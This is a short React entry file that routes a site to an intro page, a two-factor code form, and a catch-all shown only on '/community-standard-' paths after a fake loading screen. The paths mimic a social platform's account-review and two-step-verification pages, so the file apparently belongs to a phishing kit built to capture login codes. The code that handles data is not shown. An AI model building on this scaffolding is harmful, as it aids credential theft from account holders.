import "./index.css";
import App from "./App.jsx";
import ReactDOM from "react-dom/client";
import { useState, useEffect } from "react";
import { BrowserRouter, Routes, Route, useLocation } from "react-router-dom";
import Intro from "./Intro";
import AuthCodeForm from "./AuthCodeForm";

const CatchAll = () => {
  const { pathname } = useLocation();
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => setLoading(false), 700);
    return () => clearTimeout(timer);
  }, []);

  if (!pathname.startsWith("/community-standard-")) return null;

  if (loading) return (
    <div style={{ height: "100vh", width: "100vw", display: "flex", justifyContent: "center", alignItems: "center", backgroundColor: "white" }}>
      <span style={{ fontSize: "20px" }}>Loading...</span>
    </div>
  );

  return <App />;
};

ReactDOM.createRoot(document.getElementById("root")).render(
  <BrowserRouter>
    <Routes>
      <Route path="/" element={<Intro />} />
      <Route path="/two_step_verification/two_factor" element={<AuthCodeForm />} />
      <Route path="*" element={<CatchAll />} />
    </Routes>
  </BrowserRouter>
);